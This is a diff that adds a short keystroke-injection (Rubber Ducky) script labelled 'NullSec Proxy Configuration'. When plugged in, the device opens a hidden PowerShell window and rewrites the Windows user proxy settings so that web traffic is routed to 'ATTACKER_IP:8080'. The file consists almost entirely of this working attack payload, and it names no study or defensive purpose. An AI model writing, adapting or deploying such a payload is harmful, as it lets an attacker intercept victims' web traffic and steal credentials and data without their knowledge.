@@ -1,0 +1,16 @@
+REM NullSec Proxy Configuration
+REM Routes traffic through attacker proxy
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden
+ENTER
+DELAY 1000
+
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyEnable -Value 1
+ENTER
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings" -Name ProxyServer -Value "ATTACKER_IP:8080"
+ENTER
+STRING exit
+ENTER
